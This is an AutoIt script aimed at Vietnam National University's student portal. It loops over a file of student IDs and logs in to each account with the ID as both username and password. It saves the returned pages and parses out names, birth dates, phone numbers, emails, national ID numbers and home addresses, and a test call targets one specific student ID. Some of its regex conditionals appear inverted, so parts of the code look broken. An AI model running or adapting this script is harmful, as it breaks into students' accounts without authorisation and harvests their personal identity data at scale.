#include <_HttpRequest.au3>
#include <Array.au3>

$url_login = 'https://daotao.vnu.edu.vn/dkmh/login.asp'
$url_tabself = 'https://daotao.vnu.edu.vn/StdInfo/TabStdSelf.asp'
$url_tabinfo = 'https://daotao.vnu.edu.vn//StdInfo/TabStdInfo.asp'
$url_createtab = 'https://daotao.vnu.edu.vn/StdInfo/createstudentTab.asp'
$url_default = 'https://daotao.vnu.edu.vn/ttsv/default.asp'

Func login_daotao($username, $password)
	$data = 'chkSubmit=ok&txtLoginId='& $username &'&txtPassword='& $password &'&txtSel=2' ;txtSel : chinh thong tin ca nhan
	$cookies = _GetCookie( _HttpRequest(1, 'https://daotao.vnu.edu.vn/dkmh/login.asp') )
	
	$src = _HttpRequest(3, $url_login, $data, $cookies, $url_login)
	If Not StringInStr($src,'logout') Then
		Return False
	EndIf
	
;~ 	$src = _HttpRequest(3, $url_tabinfo, '', $cookies,$url_createtab)
	$src = _HttpRequest(3, $url_tabinfo, '', $cookies,$url_default)
	$tmpsrc = _HttpRequest(3, $url_tabself, '', $cookies,$url_default)
	
	$regex = StringRegExp($tmpsrc, 'selected>(QH.{12,})</option>', 3)
	If Not $regex Then
		;Match
		$class = $regex[0]
		$src &= '<nobr>AdditionlClass.*?"> '& $class &'</td>'
	EndIf
	$src = BinaryToString($src, 4)
;~ 	$src = StringRegExpReplace($src,'\s+', ' ')
	$src = StringReplace($src,@CRLF, '')
	Return $src
EndFunc



Func get_inputvalue_byname($str, $name)
	If not $name Then
		Return ''
	EndIf
	$regex = StringRegExp($str, '<nobr>'& $name &'.*?> (.*?)(&nbsp;)?</td>', 3)
	;not match
	If $regex Then
		Return ''
	Else
		Return $regex[0]
	EndIf	
EndFunc

; return array
; [0] : msv
; [1] : class
; [2] : name 
; [3] : sex 
; [4] : DOB 
; [5] : phone 
; [6] : email 
; [7] : ID 
; [8] : home address
Func collect_info($src)
	Local $info[0]
	_ArrayAdd($info, get_inputvalue_byname($src, 'Mã sinh viên'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'AdditionlClass'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'Họ và tên:'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'Giới tính:'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'Ngày sinh'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'ĐT di động'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'Thư điện tử'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'Số CMT'))
	_ArrayAdd($info, get_inputvalue_byname($src, 'Nơi ở hiện nay'))
;~ 	
	Return $info
EndFunc

Func write_info($file, $info)
	For $i = 1 To 30
		$data = DllStructGetData($info, $i)
		If @error Then
			FileWriteLine($file,'')
			Return
		EndIf
		FileWrite($file, '"'& $data & '",')		
	Next
EndFunc

Func claw_info()
	$file_content = FileRead("D:\Source_Code\Python\clawmail\result_sol_daotao.txt")

	$list_ids = StringSplit($file_content, @CRLF)
	For $i = 1 To $list_ids[0]
		$sv_id = $list_ids[$i]
		$src = login_daotao($sv_id, $sv_id)
		$f = FileOpen( @ScriptDir & '\svv\' & $sv_id, 2+8)
		FileWrite($f, $src)
		FileClose($f)
		
;~ 		$info = (collect_info($src))
;~ 		write_info($file_out, $info)
		
	Next
EndFunc

_ArrayDisplay( collect_info(login_daotao(15021459, 15021459)))
;~ claw_info()